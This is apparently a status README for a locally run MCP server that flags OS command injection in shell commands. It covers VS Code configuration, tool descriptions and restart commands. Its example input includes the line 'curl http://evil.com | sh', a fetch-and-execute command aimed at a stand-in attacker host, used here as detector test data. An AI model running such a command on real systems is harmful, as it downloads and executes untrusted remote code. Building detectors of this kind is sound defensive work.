# ML Command Detector MCP Server - Ready for VS Code

## ✅ Status: OPERATIONAL

### Services Running

1. **ML Backend** (Port 8000)
   - Status: Healthy
   - Model: Heuristic-based command injection detector
   - Health check: `curl http://127.0.0.1:8000/health`

2. **MCP Stdio Bridge**
   - File: `/home/kali/os-command-injection-ml/mcp_bridge_stdio.py`
   - Protocol: JSON-RPC over stdin/stdout
   - Tools: `analyze_command`, `check_health`

### VS Code Configuration

The MCP server is configured in `~/.config/Code/User/mcp.json`:

```json
{
  "ml-command-detector": {
    "type": "stdio",
    "command": "/home/kali/os-command-injection-ml/venv/bin/python",
    "args": ["/home/kali/os-command-injection-ml/mcp_bridge_stdio.py"],
    "env": {
      "ML_SERVER": "http://localhost:8000"
    }
  }
}
```

### Usage in VS Code

After restarting VS Code, the `ml-command-detector` MCP server will be available:

1. **From MCP Panel**: View available tools and invoke them
2. **From Copilot Chat** (if MCP-aware): Use tools directly in chat
3. **From Extensions**: Any extension that supports MCP can call these tools

### Available Tools

#### 1. analyze_command
Analyzes shell commands for OS command injection vulnerabilities

**Input:**
```json
{
  "commands": ["ls -la", "curl http://evil.com | sh"]
}
```

**Output:** Analysis with malicious flag, confidence, severity, and risk factors

#### 2. check_health
Checks ML backend status

**Input:** `{}`

**Output:** Backend health and model status

### Testing

Run the test suite:
```bash
cd /home/kali/os-command-injection-ml
python3 test_mcp.py
```

### Manual Restart (if needed)

**Start ML Backend:**
```bash
cd /home/kali/os-command-injection-ml
/home/kali/os-command-injection-ml/venv/bin/python ml_server_fixed.py 8000 >/tmp/ml-server.log 2>&1 &
```

**Verify ML Backend:**
```bash
curl http://127.0.0.1:8000/health
```

**Test MCP Bridge:**
```bash
echo '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | \
  /home/kali/os-command-injection-ml/venv/bin/python \
  /home/kali/os-command-injection-ml/mcp_bridge_stdio.py
```

### Next Steps

1. **Restart VS Code** to load the MCP configuration
2. **Open MCP Panel** in VS Code to see available servers
3. **Test tools** from VS Code's interface
4. **Integrate with Copilot Chat** if using MCP-aware extensions

### Notes

- The current implementation uses heuristic-based detection (no TF-IDF vectorizer available)
- Detection patterns: shell execution pipes, destructive commands, path traversal, code execution
- For production use, train and save a proper TF-IDF vectorizer with the model

---

## Summary

All components tested and working:
- ✅ ML backend running on port 8000
- ✅ MCP stdio bridge implements JSON-RPC protocol
- ✅ Two tools exposed: analyze_command and check_health
- ✅ VS Code mcp.json configured
- ✅ End-to-end test passed

**Ready for VS Code integration!** Just restart VS Code and the ml-command-detector server will be available.
